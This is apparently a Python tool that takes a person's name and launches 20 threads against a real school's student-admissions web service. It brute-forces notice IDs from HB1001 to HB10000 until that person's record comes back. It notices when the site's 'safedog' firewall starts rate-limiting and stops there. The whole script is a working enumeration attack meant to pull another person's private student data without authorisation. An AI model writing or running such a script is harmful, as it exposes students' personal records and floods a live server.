from threading import Thread, Lock, current_thread
import time,requests,os
url="https://oa.cqyz.cn/Web Services/student.asmx/NewStudents_Get2"
head={
	"method":"POST",
	"Content-Type": "application/json;utf-8"
}
body={
	"name":"",
	"noticeId":"HB"
}
body["name"]=input("你要查询的人是：")
loop=1000
# looplock=Lock()
found=False
def func():
	global loop,found
	while((not found) and (loop<10000)):
		# looplock.acquire()
		loop+=1
		body["noticeId"]="HB"+str(loop)
		print("[{}] 正在对比".format(current_thread().name)+body["noticeId"])
		# print("[0] 正在对比"+body["noticeId"])
		# looplock.release()
		res=requests.post(url,headers=head,data=str(body).encode("utf-8"))
		if res.text.find("JumpSelf")!=-1:
			print("JumpSelf",loop)
			# print(res.text)
			# input("按[Enter]继续")
			# loop-=1
		elif res.text.find("safedog")!=-1:
			found=True
			print("Error 请求过于频繁")
			exit()
		elif res.json()["d"]["type"]!=None:
			found=True
			print("查询完成！用时："+str(time.time()-start)+"s")
			print(res.json())
			exit()
		# time.sleep(1/20)

start=time.time()
pro=[]
for i in range(0,20,1):
	pro.append(Thread(target=func,name=str(i)))
	pro[i].start()
	# time.sleep(0.5)
# func()